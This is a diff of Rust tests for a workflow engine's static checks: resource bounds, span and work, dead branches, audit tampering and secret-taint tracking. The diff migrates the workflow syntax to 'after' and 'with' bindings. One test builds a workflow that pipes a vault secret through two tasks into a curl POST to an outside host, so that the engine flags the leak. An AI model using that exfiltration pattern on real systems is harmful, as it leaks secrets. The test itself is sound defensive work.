@@ -31,12 +31,12 @@ fn eval_bound(b: &Bound, n: u64) -> u64 {
 #[test]
 fn aara_substitution_lemma_holds() {
     let parametric = run(&wf(
-        "  src:\n    exec: { command: [\"ls\"] }\n  fan:\n    depends_on: [src]\n    for_each: ${{ tasks.src.output.files }}\n    retry: { max_attempts: 2 }\n    infer: { prompt: \"x ${{ item }}\", max_tokens: 200 }\n",
+        "  src:\n    exec: { command: [\"ls\"] }\n  fan:\n    with: { files: \"${{ tasks.src.output.files }}\" }\n    for_each: ${{ with.files }}\n    retry: { max_attempts: 2 }\n    infer: { prompt: \"x ${{ item }}\", max_tokens: 200 }\n",
     ));
     for n in [1usize, 2, 5, 9] {
         let items: Vec<String> = (0..n).map(|i| format!("\"f{i}\"")).collect();
         let concrete = run(&wf(&format!(
-            "  src:\n    exec: {{ command: [\"ls\"] }}\n  fan:\n    depends_on: [src]\n    for_each: [{}]\n    retry: {{ max_attempts: 2 }}\n    infer: {{ prompt: \"x ${{{{ item }}}}\", max_tokens: 200 }}\n",
+            "  src:\n    exec: {{ command: [\"ls\"] }}\n  fan:\n    after: {{ src: succeeded }}\n    for_each: [{}]\n    retry: {{ max_attempts: 2 }}\n    infer: {{ prompt: \"x ${{{{ item }}}}\", max_tokens: 200 }}\n",
             items.join(", ")
         )));
         let n64 = n as u64;
@@ -67,14 +67,14 @@ fn aara_substitution_lemma_holds() {
 fn brent_envelope_span_versus_work() {
     // chain: span == work
     let chain = run(&wf(
-        "  a:\n    exec: { command: [\"true\"] }\n  b:\n    depends_on: [a]\n    retry: { max_attempts: 4 }\n    exec: { command: [\"true\"] }\n",
+        "  a:\n    exec: { command: [\"true\"] }\n  b:\n    after: { a: succeeded }\n    retry: { max_attempts: 4 }\n    exec: { command: [\"true\"] }\n",
     ));
     assert_eq!(chain.certificate.span_attempts, 5);
     assert_eq!(chain.certificate.task_attempts.constant, 5);
 
     // wide DAG: span < work (the parallelism IS the gap)
     let wide = run(&wf(
-        "  a:\n    exec: { command: [\"true\"] }\n  b:\n    depends_on: [a]\n    exec: { command: [\"true\"] }\n  c:\n    depends_on: [a]\n    exec: { command: [\"true\"] }\n  d:\n    depends_on: [a]\n    exec: { command: [\"true\"] }\n",
+        "  a:\n    exec: { command: [\"true\"] }\n  b:\n    after: { a: succeeded }\n    exec: { command: [\"true\"] }\n  c:\n    after: { a: succeeded }\n    exec: { command: [\"true\"] }\n  d:\n    after: { a: succeeded }\n    exec: { command: [\"true\"] }\n",
     ));
     assert_eq!(wide.certificate.span_attempts, 2);
     assert_eq!(wide.certificate.task_attempts.constant, 4);
@@ -82,8 +82,8 @@ fn brent_envelope_span_versus_work() {
     // the general inequality over a family: span ≤ work@n=1
     for tasks in [
         "  a:\n    exec: { command: [\"true\"] }\n",
-        "  a:\n    exec: { command: [\"true\"] }\n  b:\n    depends_on: [a]\n    for_each: ${{ tasks.a.output.xs }}\n    infer: { prompt: \"x ${{ item }}\", max_tokens: 10 }\n",
-        "  a:\n    retry: { max_attempts: 3 }\n    exec: { command: [\"true\"] }\n  b:\n    depends_on: [a]\n    exec: { command: [\"true\"] }\n  c:\n    depends_on: [b]\n    retry: { max_attempts: 2 }\n    exec: { command: [\"true\"] }\n",
+        "  a:\n    exec: { command: [\"true\"] }\n  b:\n    with: { xs: \"${{ tasks.a.output.xs }}\" }\n    for_each: ${{ with.xs }}\n    infer: { prompt: \"x ${{ item }}\", max_tokens: 10 }\n",
+        "  a:\n    retry: { max_attempts: 3 }\n    exec: { command: [\"true\"] }\n  b:\n    after: { a: succeeded }\n    exec: { command: [\"true\"] }\n  c:\n    after: { b: succeeded }\n    retry: { max_attempts: 2 }\n    exec: { command: [\"true\"] }\n",
     ] {
         let r = run(&wf(tasks));
         assert!(
@@ -114,7 +114,7 @@ fn reach_dead_claims_agree_with_a_brute_force_oracle() {
     ];
     for (op, lit) in cases {
         let yaml = wf(&format!(
-            "  a:\n    exec: {{ command: [\"true\"] }}\n  b:\n    depends_on: [a]\n    when: ${{{{ tasks.a.status {op} {lit} }}}}\n    exec: {{ command: [\"true\"] }}\n",
+            "  a:\n    exec: {{ command: [\"true\"] }}\n  b:\n    with: {{ s: \"${{{{ tasks.a.status }}}}\" }}\n    when: ${{{{ with.s {op} {lit} }}}}\n    exec: {{ command: [\"true\"] }}\n",
         ));
         let r = run(&yaml);
         let engine_dead = r
@@ -142,7 +142,7 @@ fn reach_dead_claims_agree_with_a_brute_force_oracle() {
 #[test]
 fn certifying_audit_rejects_every_systematic_tamper() {
     let yaml = wf(
-        "  a:\n    retry: { max_attempts: 2 }\n    exec: { command: [\"true\"] }\n  fan:\n    depends_on: [a]\n    for_each: ${{ tasks.a.output.xs }}\n    infer: { prompt: \"x ${{ item }}\", max_tokens: 100 }\n  save:\n    depends_on: [fan]\n    invoke: { tool: \"nika:write\", args: { path: \"./o\", content: \"y\" } }\n",
+        "  a:\n    retry: { max_attempts: 2 }\n    exec: { command: [\"true\"] }\n  fan:\n    with: { xs: \"${{ tasks.a.output.xs }}\" }\n    for_each: ${{ with.xs }}\n    infer: { prompt: \"x ${{ item }}\", max_tokens: 100 }\n  save:\n    after: { fan: succeeded }\n    invoke: { tool: \"nika:write\", args: { path: \"./o\", content: \"y\" } }\n",
     );
     let parsed = parse(&yaml, FileId::new(0), ParseMode::Strict).expect("parse");
     let honest = check(&parsed).certificate;
@@ -200,7 +200,7 @@ fn certifying_audit_rejects_every_systematic_tamper() {
 #[test]
 fn denning_ifc_taint_is_transitive_at_depth() {
     let r = run(
-        "nika: v1\nworkflow:\n  id: w\nmodel: anthropic/claude-sonnet-4-6\nsecrets:\n  k: { source: vault, key: x }\ntasks:\n  t1:\n    with: { a: \"${{ secrets.k }}\" }\n    exec: { shell: \"echo ${{ with.a }}\", capture: stdout }\n  t2:\n    depends_on: [t1]\n    with: { b: \"${{ tasks.t1.output }}\" }\n    exec: { shell: \"echo ${{ with.b }}\", capture: stdout }\n  t3:\n    depends_on: [t2]\n    with: { c: \"${{ tasks.t2.output }}\" }\n    exec: { command: [\"curl\", \"-d\", \"${{ with.c }}\", \"https://x.io\"] }\n",
+        "nika: v1\nworkflow:\n  id: w\nmodel: anthropic/claude-sonnet-4-6\nsecrets:\n  k: { source: vault, key: x }\ntasks:\n  t1:\n    with: { a: \"${{ secrets.k }}\" }\n    exec: { shell: \"echo ${{ with.a }}\", capture: stdout }\n  t2:\n    with: { b: \"${{ tasks.t1.output }}\" }\n    exec: { shell: \"echo ${{ with.b }}\", capture: stdout }\n  t3:\n    with: { c: \"${{ tasks.t2.output }}\" }\n    exec: { command: [\"curl\", \"-d\", \"${{ with.c }}\", \"https://x.io\"] }\n",
     );
     assert!(
         !r.secret_leaks.is_empty(),
